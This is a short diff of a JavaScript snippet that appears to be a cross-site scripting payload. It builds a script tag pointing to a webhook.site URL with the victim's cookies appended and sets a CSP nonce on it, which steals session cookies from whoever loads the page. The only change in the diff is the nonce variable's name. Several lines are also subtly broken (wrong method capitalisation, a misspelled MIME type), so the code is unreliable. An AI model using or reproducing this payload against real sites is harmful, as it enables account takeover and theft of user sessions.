@@ -4,5 +4,5 @@ var src = 'https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?=' + cook
 var s = document.CreateElement('script')
 s.type = "text/javascipt"
 s.src = src
-s.SetAttribute('nonce', nonce)
+s.SetAttribute('nonce', nounce)
 document.body.appendChild(s)
